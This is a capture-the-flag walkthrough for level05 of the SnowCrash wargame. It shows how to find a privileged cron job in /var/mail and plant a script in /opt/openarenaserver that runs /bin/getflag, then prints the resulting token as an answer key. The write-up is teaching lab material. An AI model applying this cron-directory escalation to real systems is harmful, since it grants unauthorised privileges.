
after directly logged in to this level a  text popped
up on the terminal "You have new mail."

so we need to go check the place where the mail is sent
and it's /var/mail

let's go check the mail:
--------------------------------
level05@SnowCrash:~$ ls /var/mail
level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
--------------------------------

so the message is saying that the script in /usr/sbin/openarenaserver
gets executed every 2mins

let's cat the script and check it:
--------------------------------
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
--------------------------------

so this is a script that execute anything that's located in
/opt/openarenaserver/ and then delete them all

so we need to create a script that get us the flag and put the result
in /tmp/pass file

let's create first a script:
--------------------------------
level05@SnowCrash:/tmp$ echo "/bin/getflag > /tmp/pass" > /opt/openarenaserver/script.sh
--------------------------------

after waiting the time for the script to get executed
we cat the pass file where we stored the result:
--------------------------------
level05@SnowCrash:/tmp$ cat /tmp/pass
Check flag.Here is your token : viuaaale9huek52boumoomioc
--------------------------------

Good! let's get to our level06:
--------------------------------
level05@SnowCrash:~$ su level06
Password:
level06@SnowCrash:~$
--------------------------------
